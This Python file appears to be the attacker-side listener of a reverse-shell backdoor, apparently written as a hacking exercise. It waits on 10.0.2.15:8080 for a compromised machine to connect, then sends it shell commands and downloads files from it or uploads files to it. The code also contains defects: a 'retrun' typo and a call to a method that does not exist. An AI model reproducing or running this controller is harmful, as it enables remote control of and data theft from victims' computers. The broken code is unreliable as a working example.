import socket
#import json
import base64
import simplejson

class SocketListener:
    def __init__(self,ip,port):
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Listener.bind((ip, port))
        Listener.listen(0)
        print('Listening...')
        (self.Connection, Address) = Listener.accept()
        print('Connection Successful from ' + str(Address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.Connection.send(json_data.encode('utf-8'))

    def json_receive(self):
        json_data = ''

        while True:
            try:
                json_data = json_data + self.Connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == 'quit':
            self.Connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):
        with open(path, 'wb') as my_file:
            my_file.write(base64.b64decode(content))
            return 'Upload Successful'

    def read_file_content(self, path):
        with open(path,'rb') as my_file:
            retrun base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input = input('Enter Command: ')
            command_input = command_input.split(' ')
            try:
                if command_input[0] == 'upload':
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == 'download' and 'Error!' not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = 'Error'
            print(command_output)

socket_listener = SocketListener('10.0.2.15',8080)
socket_listener.start_listener()
